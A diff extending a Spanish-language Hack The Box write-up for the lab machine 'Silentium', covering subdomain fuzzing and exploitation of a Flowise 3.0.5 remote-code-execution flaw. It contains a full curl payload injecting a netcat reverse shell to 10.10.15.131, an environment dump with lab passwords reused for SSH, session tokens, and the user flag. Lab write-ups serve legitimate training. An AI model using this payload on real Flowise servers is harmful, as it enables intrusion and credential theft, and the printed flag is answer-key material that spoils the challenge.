@@ -56,6 +56,14 @@ Agregar `silentium.htb` al archivo `/etc/hosts`
 
 [http://silentium.htb/](http://silentium.htb/)
 
+[http://silentium.htb/#team](http://silentium.htb/#team)
+
+<div style="display: flex; justify-content: center;">
+
+![Silentium Web Users](@images/writeups/hackthebox/silentium/silentium-web-users.png)
+
+</div>
+
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://silentium.htb -H 'Host: FUZZ.silentium.htb' -ic -c -fs 178
 ```
@@ -173,6 +181,8 @@ curl -s http://staging.silentium.htb/api/v1/version | jq
 }
 ```
 
+## Exploitation
+
 Google `flowise 3.0.5`
 
 [https://www.exploit-db.com/exploits/52557](https://www.exploit-db.com/exploits/52557)
@@ -201,3 +211,102 @@ _____       _                              _____
 ![Silentium Forgot Password](@images/writeups/hackthebox/silentium/silentium-forgot-password.png)
 
 </div>
+
+[Flowise has Remote Code Execution vulnerability](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
+
+```bash
+nc -lnvp 1111
+```
+
+```bash
+curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP -H "Content-Type: application/json" -H "x-request-from: internal" -H "Cookie: connect.sid=s%3AmrKL7ZGXA2gSgEbv8UwjJvxk6f2t5vRM.2M0moEwyNzWWJJbFIVtQQsUWBBLeuZ0CsqFFfGD9T2E; refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiNDc0OWMyZjk5ODg2ZjhjM2U2NmQwNzlkOGU2NWI2MDg6MmZhNTMzYWQxOWMyYWM1YTY2NmFkMjA5NTM0MTFjZjExNDkzZDRmYWY3MzJiMGQxODhiYzg2NTZjZTIwNzljYzQxZDM1Y2ZkMTFlYmRjYjUyYjYzOGQ4NmI5OWJiNjI1MmE5MDU0YmQxMTIwNDExNzYzOTkyZTU2YzE4NDIyNDA5ODQ2ZDE1NDkzOGZmMjY2Y2E4ZTM1ZTQyMzZjMmJkMCIsImlhdCI6MTc4MDY4NTE1MywibmJmIjoxNzgwNjg1MTUzLCJleHAiOjE3ODMyNzcxNTMsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.NDaVw0AA2d2MmkhSG-WrUBHe5oEC0iWRNZ46MDngiE4; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiZWY4YTQ5MWVjMGYxNGRlNjg5NThmMmM5ZGNkMTA3YTY6N2Y1M2Y5NTZhYTZlZjkwMWFiMzEyYWE0ZDk1ZGExYjc1MGY5ODNjM2E5MjYzYTg3YTJkZDM0MDBiMWVhYjgzNDI4OTFhMzU1YTIzNzhiMTBhYTk3NzNkYTg0ZjkxNTQ0OTZkN2ZlYzRjYjk5ZDUzZmMxNGM3Zjk1MGUwYmE2MDA2MDliNTQwMzJlNWE4NmY3MzZmOTVkMWI3OTQ0YjdkOSIsImlhdCI6MTc4MDY4NTE1MywibmJmIjoxNzgwNjg1MTUzLCJleHAiOjE3ODA3MDY3NTMsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.EIqq2YJKLMYN9qoYihh2kZNyeTBGn69a4VD2sGHLuUo" -d '{"loadMethod": "listActions", "inputs": { "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.131 1111 >/tmp/f\");return 1;})()})"}}'
+```
+
+```bash
+ls -la root
+```
+
+```plaintext
+total 16
+drwx------    1 root     root          4096 Apr  8 09:41 .
+drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
+-rw-------    1 root     root             9 Jan 29 21:22 .ash_history
+drwxr-xr-x    3 root     root          4096 Jun  5 20:06 .flowise
+```
+
+```bash
+cat /root/.ash_history
+```
+
+```plaintext
+env
+exit
+```
+
+```bash
+env
+```
+
+```plaintext
+FLOWISE_PASSWORD=F1l3_d0ck3r
+ALLOW_UNAUTHORIZED_CERTS=true
+NODE_VERSION=20.19.4
+HOSTNAME=c78c3cceb7ba
+YARN_VERSION=1.22.22
+SMTP_PORT=1025
+SHLVL=3
+PORT=3000
+HOME=/root
+SENDER_EMAIL=ben@silentium.htb
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+SMTP_USERNAME=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+FLOWISE_USERNAME=ben
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/
+SMTP_PASSWORD=r04D!!_R4ge
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+SMTP_USER=test
+```
+
+```bash
+ssh ben@silentium.htb
+```
+
+```bash
+ls -la
+```
+
+```plaintext
+total 28
+drwxr-x--- 3 ben  ben  4096 Apr  8 19:53 .
+drwxr-xr-x 3 root root 4096 Apr  8 09:41 ..
+-rw------- 1 ben  ben     0 Apr  8 19:53 .bash_history
+-rw-r--r-- 1 ben  ben   220 Jan 29 13:53 .bash_logout
+-rw-r--r-- 1 ben  ben  3771 Jan 29 13:53 .bashrc
+drwx------ 2 ben  ben  4096 Apr  8 09:41 .cache
+-rw-r--r-- 1 ben  ben   807 Jan 29 13:53 .profile
+-rw-r----- 1 root ben    33 Jun  5 19:40 user.txt
+```
+
+```bash
+cat user.txt
+```
+
+## User flag
+
+<Callout type="success" title="User flag">
+  36ef43a8c0c5294a64628db937bc387d
+</Callout>
+
+## Privilege Escalation
